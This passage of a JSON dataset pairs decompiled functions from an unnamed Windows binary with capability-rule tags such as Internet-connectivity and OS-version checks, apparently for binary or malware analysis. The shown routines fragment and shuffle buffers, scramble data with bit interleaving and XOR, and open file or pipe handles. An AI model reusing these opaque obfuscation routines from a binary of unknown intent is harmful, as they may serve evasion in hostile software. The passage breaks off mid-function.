!= 0) || (var_28h = fcn.00070e20(*arg_ch, var_ch),  var_28h == 0)) {\n                    *arg_10h = var_ch;\n                }\n            }\n        }\n        for (var_24h = var_8h; var_24h != NULL; var_24h = *var_24h) {\n            fcn.000357f0(var_24h[1]);\n        }\n        fcn.00070b70(var_8h);\n        if (var_28h != 0) {\n            fcn.000357f0(*arg_ch);\n            *arg_ch = 0;\n            *arg_10h = 0;\n        }\n    }\n    return var_28h;\n}\n",
        "token_count": 1757
    },
    "000705b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000705b0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    if (arg_ch == 1) {\n        if (arg_14h == 0x10) {\n            fcn.00078be8(arg_8h + 0x14, arg_10h, 0x10);\n            var_8h = 0;\n        }\n        else {\n            var_8h = 0x21590064;\n        }\n    }\n    iVar1 = fcn.00076b10(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n    if (var_8h != 0) {\n        iVar1 = var_8h;\n    }\n    return iVar1;\n}\n",
        "token_count": 231
    },
    "00070630": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_94h\n// WARNING: Variable defined which should be unmapped: var_90h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00070630(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_94h;\n    uint var_90h;\n    char *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = arg_ch;\ncode_r0x0007063f:\n    do {\n        iVar1 = fcn.00078140(&var_8h, &var_90h, 0x80, &var_ch);\n        if (iVar1 == 0) {\n            var_94h = 0;\ncode_r0x0007073d:\n            if (var_94h == 0) {\n                var_94h = fcn.000766e0(*(arg_8h + 4), arg_ch, arg_10h);\n            }\n            return var_94h;\n        }\n        iVar1 = fcn.00078a92(&var_90h, 0x80055908);\n        if (iVar1 == 0) {\n            var_4h = fcn.00078ae0(var_ch);\n            if (var_4h < 1) {\n                var_94h = 0x21590066;\n                goto code_r0x0007073d;\n            }\n            *(arg_8h + 0x10) = var_4h;\n            *(arg_8h + 0xc) = var_4h;\n            goto code_r0x0007063f;\n        }\n        iVar1 = fcn.00078a92(&var_90h, 0x80055914);\n        if ((iVar1 == 0) && ((*var_ch == '1' || (*var_ch == 'Y')))) {\n            *(arg_8h + 0x24) = 1;\n        }\n        else {\n            iVar1 = fcn.00078a92(&var_90h, 0x80055928);\n            if (iVar1 == 0) {\n                var_4h = fcn.00078ae0(var_ch);\n                if (var_4h < 1) {\n                    var_94h = 0x21590066;\n                    goto code_r0x0007073d;\n                }\n                *(arg_8h + 0x28) = var_4h;\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 577
    },
    "00070790": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00070790(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t var_4h;\n    \n    var_4h = fcn.0006fd50(arg_8h, arg_ch, arg_10h, 0);\n    if (var_4h == 0) {\n        var_4h = fcn.00070170(arg_8h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    return var_4h;\n}\n",
        "token_count": 151
    },
    "000707e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000707e0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint *arg_14h, int32_t *arg_18h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    if (arg_10h == 0) {\n        puVar1 = fcn.000356c0(0x10);\n        if (puVar1 == NULL) {\n            fcn.00070b70(*arg_14h);\n            *arg_14h = 0;\n            uVar2 = 0x21590004;\n        }\n        else {\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            puVar1[2] = 0;\n            puVar1[3] = 0;\n            *arg_14h = puVar1;\n            *arg_18h = 1;\n            uVar2 = 0;\n        }\n    }\n    else {\n        *arg_14h = 0;\n        *arg_18h = 0;\n        var_10h = NULL;\n        for (; var_ch < arg_10h; var_ch = var_ch + var_4h) {\n            if (*(arg_8h + 0xc) == *(arg_8h + 0x10)) {\n                if (*(arg_8h + 0xc) - *(arg_8h + 0x10) < 0x400) {\n                    var_4h = *(arg_8h + 0xc);\n                }\n                else {\n                    iVar3 = fcn.00078a6e();\n                    var_4h = *(arg_8h + 0xc) - iVar3 % 0x401;\n                }\n            }\n            else {\n                iVar3 = fcn.00078a6e();\n                var_4h = iVar3 % ((*(arg_8h + 0xc) - *(arg_8h + 0x10)) + 1) + *(arg_8h + 0x10);\n            }\n            if (arg_10h - var_ch < var_4h) {\n                var_4h = arg_10h - var_ch;\n            }\n            puVar1 = fcn.000356c0(0x10);\n            if (puVar1 == NULL) {\n                fcn.00070b70(*arg_14h);\n                *arg_14h = 0;\n                return 0x21590004;\n            }\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            puVar1[2] = 0;\n            puVar1[3] = 0;\n            puVar1[1] = arg_ch + var_ch;\n            puVar1[2] = var_4h;\n            if (var_10h == NULL) {\n                *arg_14h = puVar1;\n            }\n            else {\n                *var_10h = puVar1;\n            }\n            *arg_18h = *arg_18h + 1;\n            var_10h = puVar1;\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 752
    },
    "00070990": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00070990(uint *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *var_10h;\n    uint *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (1 < arg_ch) {\n        for (var_10h = arg_8h; var_10h != NULL; var_10h = *var_10h) {\n            iVar1 = fcn.00078a6e();\n            var_ch = arg_8h;\n            for (var_4h = 0; (var_ch != NULL && (var_4h != iVar1 % arg_ch)); var_4h = var_4h + 1) {\n                var_ch = *var_ch;\n            }\n            if (var_ch == NULL) {\n                return;\n            }\n            if ((var_ch != var_10h) && (var_ch[3] != var_10h[3])) {\n                fcn.00070c00(var_10h, var_ch);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 245
    },
    "00070a30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00070a30(int32_t arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = (*(arg_8h + 0xc) + *(arg_8h + 0x10)) / 2;\n    if ((arg_ch[2] <= iVar1) || (var_ch = iVar1,  iVar1 <= arg_ch[2] + (arg_ch[2] >> 0x1f & 3U) >> 2)) {\n        var_ch = arg_ch[2] / 2;\n    }\n    var_8h = arg_ch[2] - var_ch;\n    if ((0x400 < var_ch) && (var_8h + 0x400 <= iVar1)) {\n        iVar2 = fcn.00078a6e();\n        var_ch = var_ch - iVar2 % 0x401;\n        var_8h = arg_ch[2] - var_ch;\n    }\n    if ((0x400 < var_8h) && (var_ch + 0x400 <= iVar1)) {\n        iVar1 = fcn.00078a6e();\n        var_8h = var_8h - iVar1 % 0x401;\n        var_ch = arg_ch[2] - var_8h;\n    }\n    puVar3 = fcn.000356c0(0x10);\n    if (puVar3 == NULL) {\n        uVar4 = 0x21590004;\n    }\n    else {\n        *puVar3 = 0;\n        puVar3[1] = 0;\n        puVar3[2] = 0;\n        puVar3[3] = 0;\n        puVar3[2] = var_8h;\n        puVar3[3] = arg_ch[3];\n        puVar3[1] = arg_ch[1] + var_ch;\n        arg_ch[2] = var_ch;\n        *puVar3 = *arg_ch;\n        *arg_ch = puVar3;\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 516
    },
    "00070b70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00070b70(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint var_4h;\n    \n    while (arg_8h != NULL) {\n        puVar1 = *arg_8h;\n        fcn.000357f0(arg_8h);\n        arg_8h = puVar1;\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "00070ba0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00070ba0(int32_t **arg_8h)\n\n{\n    int32_t **var_8h;\n    int32_t **var_4h;\n    \n    for (var_4h = arg_8h; *var_4h != NULL; var_4h = *var_4h) {\n        for (var_8h = *var_4h; var_8h != NULL; var_8h = *var_8h) {\n            if (var_8h[3] < var_4h[3]) {\n                fcn.00070c00(var_4h, var_8h);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "00070c80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00070c80(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint8_t var_9h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.000356c0(arg_ch);\n    if (iVar1 == 0) {\n        iVar1 = 0;\n    }\n    else if (arg_ch < 0xb) {\n        fcn.00078be8(iVar1, arg_8h, arg_ch);\n    }\n    else {\n        var_24h = arg_ch;\n        var_1ch = 0;\n        do {\n            var_1ch = var_24h % 10 + var_1ch;\n            var_24h = var_24h / 10;\n        } while (0 < var_24h);\n        var_8h = 0;\n        var_18h = 0;\n        var_9h = 0;\n        for (var_10h = 0; var_10h < arg_ch / var_1ch; var_10h = var_10h + 1) {\n            for (var_4h = 0; var_4h < 8; var_4h = var_4h + 1) {\n                for (var_14h = 0; var_14h < var_1ch; var_14h = var_14h + 1) {\n                    var_9h = var_9h | ((*(arg_8h + (arg_ch / var_1ch) * var_14h + var_10h) & 1 << (var_4h & 0x1f)) >>\n                                      (var_4h & 0x1f)) << (var_18h & 0x1f);\n                    var_18h = var_18h + 1;\n                    if (7 < var_18h) {\n                        *(iVar1 + var_8h) = var_9h;\n                        var_8h = var_8h + 1;\n                        var_9h = 0;\n                        var_18h = 0;\n                    }\n                }\n            }\n        }\n        var_10h = 0;\n        for (; var_8h < arg_ch; var_8h = var_8h + 1) {\n            *(iVar1 + var_8h) = *(arg_8h + var_8h) ^ *(iVar1 + var_10h);\n            var_10h = var_10h + 1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 636
    },
    "00070e20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00070e20(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint8_t *arg_8h_00;\n    int32_t iVar2;\n    uint8_t var_21h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_ch < 0xb) {\n        uVar1 = 0;\n    }\n    else {\n        arg_8h_00 = fcn.000356c0(arg_ch);\n        if (arg_8h_00 == NULL) {\n            uVar1 = 0x21590004;\n        }\n        else {\n            fcn.00078be8(arg_8h_00, arg_8h, arg_ch);\n            fcn.00078bfa(arg_8h, 0, arg_ch);\n            var_20h = arg_ch;\n            var_1ch = 0;\n            do {\n                var_1ch = var_20h % 10 + var_1ch;\n                var_20h = var_20h / 10;\n            } while (0 < var_20h);\n            iVar2 = arg_ch / var_1ch;\n            var_8h = 0;\n            var_21h = *arg_8h_00;\n            var_ch = 1;\n            for (var_10h = 0; var_10h < iVar2; var_10h = var_10h + 1) {\n                for (var_4h = 0; var_4h < 8; var_4h = var_4h + 1) {\n                    for (var_18h = 0; var_18h < var_1ch; var_18h = var_18h + 1) {\n                        *(arg_8h + iVar2 * var_18h + var_10h) =\n                             *(arg_8h + iVar2 * var_18h + var_10h) |\n                             ((var_21h & 1 << (var_8h & 0x1f)) >> (var_8h & 0x1f)) << (var_4h & 0x1f);\n                        var_8h = var_8h + 1;\n                        if (7 < var_8h) {\n                            var_21h = arg_8h_00[var_ch];\n                            var_ch = var_ch + 1;\n                            var_8h = 0;\n                        }\n                    }\n                }\n            }\n            var_10h = 0;\n            for (var_ch = var_ch + -1; var_ch < arg_ch; var_ch = var_ch + 1) {\n                *(arg_8h + var_ch) = arg_8h_00[var_ch] ^ arg_8h_00[var_10h];\n                var_10h = var_10h + 1;\n            }\n            fcn.000357f0(arg_8h_00);\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 727
    },
    "00071000": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00071000(int32_t arg_8h, unkbyte3 *arg_ch, int32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    uint var_8h;\n    uint var_1h;\n    \n    if (arg_10h == 0) {\n        return 0;\n    }\n    if (*arg_ch == '\\x01') {\n        if (arg_10h != 3) {\n            return 0;\n        }\n        var_8h._1_2_ = *arg_ch >> 8;\n        uVar1 = fcn.00035980(arg_ch & 0xffff0000 | var_8h._1_2_);\n        if (uVar1 == 0) {\n            return 0;\n        }\n        *(arg_8h + 0x10) = uVar1;\n        *(arg_8h + 0xc) = *(arg_8h + 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 245
    },
    "00071090": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00071090(int32_t *arg_8h, uint noname_1, char *arg_10h, char *arg_14h, char *arg_18h, char *arg_1ch, \n            uint32_t arg_20h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_38h;\n    uint var_30h;\n    char *var_2ch;\n    uint var_28h;\n    uint var_20h;\n    char *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    var_4h = fcn.000356c0(0x3c);\n    if (var_4h == 0) {\n        var_10h = 0x21590004;\n        goto code_r0x00071228;\n    }\n    fcn.00078bfa(var_4h, 0, 0x3c);\n    if (arg_10h != NULL) {\n        if ((arg_20h & 1) == 0) {\n            var_10h = 0x215900c9;\n            goto code_r0x00071228;\n        }\n        if (arg_10h[arg_14h + -1] == '\\0') {\n            var_1ch = arg_10h;\n            do {\n                cVar1 = *var_1ch;\n                var_1ch = var_1ch + 1;\n            } while (cVar1 != '\\0');\n            if (var_1ch + (1 - (arg_10h + 1)) == arg_14h) {\n                fcn.00078bca(&var_ch, arg_10h);\n                iVar2 = fcn.00078bbe(var_4h + 4, &var_ch, 1);\n                if (iVar2 != 0) {\n                    var_10h = 0x21590004;\n                    goto code_r0x00071228;\n                }\n                fcn.000349b0(var_4h + 0x20);\n                goto code_r0x00071178;\n            }\n        }\n        var_10h = 0x21590067;\n        goto code_r0x00071228;\n    }\ncode_r0x00071178:\n    if (arg_18h == NULL) {\ncode_r0x00071219:\n        *arg_8h = var_4h;\n        var_10h = 0;\n    }\n    else {\n        if ((arg_20h & 2) == 0) {\n            var_10h = 0x215900cb;\n            goto code_r0x00071228;\n        }\n        if (arg_18h[arg_1ch + -1] == '\\0') {\n            var_2ch = arg_18h;\n            do {\n                cVar1 = *var_2ch;\n                var_2ch = var_2ch + 1;\n            } while (cVar1 != '\\0');\n            if (var_2ch + (1 - (arg_18h + 1)) == arg_1ch) {\n                fcn.00078bca(&var_ch, arg_18h);\n                iVar2 = fcn.00078bbe(var_4h + 0xc, &var_ch, 1);\n                if (iVar2 != 0) {\n                    var_10h = 0x21590004;\n                    goto code_r0x00071228;\n                }\n                goto code_r0x00071219;\n            }\n        }\n        var_10h = 0x21590069;\n    }\ncode_r0x00071228:\n    if ((var_10h != 0) && (var_4h != 0)) {\n        fcn.00078bd0(var_4h + 4);\n        fcn.00078bd0(var_4h + 0xc);\n        fcn.000357f0(var_4h);\n    }\n    return var_10h;\n}\n",
        "token_count": 907
    },
    "00071270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00071270(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    *(arg_8h + 0x18) = 1;\n    iVar1 = *(arg_8h + 0x14);\n    *(arg_8h + 0x14) = 0;\n    if (iVar1 != 0) {\n        fcn.000789b4(iVar1);\n    }\n    iVar1 = *(arg_8h + 0x1c);\n    *(arg_8h + 0x1c) = 0;\n    if (iVar1 != 0) {\n        fcn.000789b4(iVar1);\n        fcn.00034a10(arg_8h + 0x20);\n        fcn.00034a80(arg_8h + 0x20);\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "000712e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000712e0(int32_t arg_8h)\n\n{\n    if (*(arg_8h + 8) != 0) {\n        fcn.000349e0(arg_8h + 0x20);\n    }\n    fcn.00078bd0(arg_8h + 4);\n    fcn.00078bd0(arg_8h + 0xc);\n    fcn.000357f0(*(arg_8h + 0x2c));\n    fcn.000357f0(*(arg_8h + 0x38));\n    fcn.000357f0(arg_8h);\n    return;\n}\n",
        "token_count": 145
    },
    "00071340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x000713c7\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00071340(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(arg_8h + 0x14) == 0) && (*(arg_8h + 0x10) != 0)) {\n        var_38h = 0x18;\n        var_34h = 0;\n        var_2ch = 0x40;\n        var_30h = arg_8h + 0xc;\n        var_28h = 0;\n        if (0 < *(arg_8h + 0x24)) {\n            var_20h = 0xc;\n            var_18h._0_1_ = 0;\n            var_18h._1_1_ = 0;\n            if (*(arg_8h + 0x24) - 1U < 4) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        var_24h = 0;\n        var_14h = fcn.0001f080(arg_8h + 0x14, 0xc0000000, &var_38h, &var_10h, 0, 0, 0, 1, 0, 0, 0);\n        if (var_14h == 0) {\n            var_8h = 1;\n            var_4h = 0;\n            var_14h = fcn.000789cc(*(arg_8h + 0x14), &var_10h, &var_8h, 8, 0x17);\n            if (var_14h == 0) {\n                uVar1 = 0;\n            }\n            else {\n                fcn.000789b4(*(arg_8h + 0x14));\n                *(arg_8h + 0x14) = 0;\n                uVar1 = fcn.00078a2c(var_14h);\n            }\n        }\n        else {\n            uVar1 = fcn.00078a2c(var_14h);\n        }\n    }\n    else {\n        uVar1 = 0x21590065;\n    }\n    return uVar1;\n}\n",
        "token_count": 625
    },
    "000714a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_44h\n\nint32_t __cdecl fcn.000714a0(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t var_60h;\n    uint *var_5ch;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint *var_4h;\n    \n    var_4h = NULL;\n    var_10h = 0;\n    var_40h = 0;\n    uVar3 = 0;\n    var_3ch = fcn.00078ab0(&fcn.000714a0::var_5ch, 0x10000000, 0, 1, 0);\n    if (var_3ch != 0) {\n        iVar1 = fcn.00078a2c(var_3ch);\n        return iVar1;\n    }\n    iVar1 = fcn.00037260(&fcn.000714a0::var_10h);\n    var_3ch = iVar1;\n    if (iVar1 == 0) {\n        var_58h = 0x18;\n        var_54h = 0;\n        var_4ch = 0x40;\n        var_50h = arg_8h + 4;\n        var_48h = var_10h;\n        var_44h = 0;\n        var_14h = 0;\n        var_38h = 1;\n        var_34h = 1;\n        var_30h = 0;\n        var_2ch = 0xff;\n        var_28h = 0x1000;\n        var_24h = 0x1000;\n        var_20h = 0xfff85ee0;\n        var_1ch = 0xffffffff;\n        var_18h = 1;\n        iVar1 = (**0x80051144)(&fcn.000714a0::var_4h, 0xc0000000, &fcn.000714a0::var_58h, &fcn.000714a0::var_ch, 0, 0, 3\n                               , 3, 0, 0, 0, 1, &fcn.000714a0::var_38h, 0);\n        var_3ch = iVar1;\n        if (iVar1 == 0) {\n            var_44h = arg_8h + 0x20;\n            var_48h = 0x715e3;\n            fcn.00034a10(var_44h);\n            if (*(arg_8h + 0x18) == '\\0') {\n                *(arg_8h + 0x1c) = var_4h;\n                var_48h = 0;\n                var_4ch = 0;\n                var_50h = 0;\n                var_54h = 0;\n                var_58h = 0x110008;\n                var_5ch = &fcn.000714a0::var_ch;\n                puVar2 = var_4h;\n                var_3ch = fcn.00078bc4(uVar3, var_5ch, 0, 0);\n                if (var_3ch == 0x103) {\n                    puVar2 = var_5ch;\n                    var_3ch = fcn.00078a62(var_5ch, 0, 0);\n                    if (var_3ch != 0) {\n                        var_60h = fcn.00078a2c(var_3ch);\n                        var_4h = *(arg_8h + 0x1c);\n                        *(arg_8h + 0x1c) = 0;\n                        iVar1 = arg_8h + 0x20;\n                        fcn.00034a80(iVar1);\n                        goto code_r0x00071782;\n                    }\n                    var_3ch = var_ch;\n                }\n                if (var_3ch == 0) {\n                    if (*(arg_8h + 0x1c) == 0) {\n                        var_60h = 0x21590006;\n                        iVar1 = arg_8h + 0x20;\n                        fcn.00034a80(iVar1);\n                    }\n                    else {\n                        *(arg_8h + 0x1c) = 0;\n                        iVar1 = arg_8h + 0x20;\n                        fcn.00034a80(iVar1);\n                        var_40h = fcn.000356c0(0x3c);\n                        if (var_40h == 0) {\n                            var_60h = 0x21590004;\n                        }\n                        else {\n                            fcn.00078bfa(var_40h, 0, 0x3c, iVar1, puVar2);\n                            *(var_40h + 0x14) = var_4h;\n                            *(var_40h + 0x28) = *(arg_8h + 0x28);\n                            *(var_40h + 0x34) = *(arg_8h + 0x34);\n                            if (*(arg_8h + 0x38) != 0) {\n                                uVar3 = fcn.00035820(*(arg_8h + 0x38));\n                                *(var_40h + 0x38) = uVar3;\n                                if (*(var_40h + 0x38) != 0) {\n                                    var_60h = 0x21590004;\n                                    goto code_r0x00071782;\n                                }\n                            }\n                            *arg_ch = var_40h;\n                            var_60h = 0;\n                        }\n                    }\n                }\n                else {\n                    var_60h = fcn.00078a2c(var_3ch);\n                    var_4h = *(arg_8h + 0x1c);\n                    *(arg_8h + 0x1c) = 0;\n                    iVar1 = arg_8h + 0x20;\n                    fcn.00034a80(iVar1);\n                }\n            }\n            else {\n                iVar1 = arg_8h + 0x20;\n                var_4ch = 0x715fa;\n                fcn.00034a80(iVar1);\n                var_60h = 0x21590006;\n            }\n        }\n        else {\n            var_48h = 0x715cf;\n            var_60h = fcn.00078a2c();\n        }\n    }\n    else {\n        var_60h = fcn.00078a2c(iVar1);\n    }\ncode_r0x00071782:\n    if (var_60h != 0) {\n        if (var_4h != NULL) {\n            fcn.000789b4(var_4h, iVar1);\n        }\n        fcn.000357f0(var_40h);\n    }\n    fcn.000373e0(var_10h);\n    fcn.000789b4(var_5ch);\n    return var_60h;\n}\n",
        "token_count": 1726
    },
    "000717c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_b4h\n// WARNING: Variable defined which should be unmapped: var_b0h\n// WARNING: Variable defined which should be unmapped: var_a8h\n\nuint __cdecl fcn.000717c0(int32_t arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    bool bVar4;\n    uint var_b4h;\n    int32_t var_b0h;\n    uint *var_a8h;\n    uint8_t *var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint *var_94h;\n    uint8_t *var_90h;\n    uint var_8ch;\n    uint var_88h;\n    char *var_8h;\n    uint var_4h;\n    \n    var_4h = arg_ch;\ncode_r0x000717cf:\n    do {\n        iVar2 = fcn.00078140(&var_4h, &var_88h, 0x80, &var_8h);\n        if (iVar2 == 0) {\n            return 0;\n        }\n        var_90h = 0x80055938;\n        var_94h = &var_88h;\n        do {\n            uVar1 = *var_94h;\n            bVar4 = uVar1 < *var_90h;\n            if (uVar1 != *var_90h) {\ncode_r0x00071864:\n                var_9ch = (1 - bVar4) - (bVar4 != 0);\n                goto code_r0x0007186f;\n            }\n            if (uVar1 == 0) break;\n            uVar1 = *(var_94h + 1);\n            bVar4 = uVar1 < var_90h[1];\n            if (uVar1 != var_90h[1]) goto code_r0x00071864;\n            var_94h = var_94h + 2;\n            var_90h = var_90h + 2;\n        } while (uVar1 != 0);\n        var_9ch = 0;\ncode_r0x0007186f:\n        if ((var_9ch == 0) && ((*var_8h == '1' || (*var_8h == 'Y')))) {\n            if (*(arg_8h + 0x2c) != 0) {\n                return 0x21590064;\n            }\n            *(arg_8h + 0x28) = 1;\n            goto code_r0x000717cf;\n        }\n        var_a4h = 0x80055948;\n        var_a8h = &var_88h;\n        do {\n            uVar1 = *var_a8h;\n    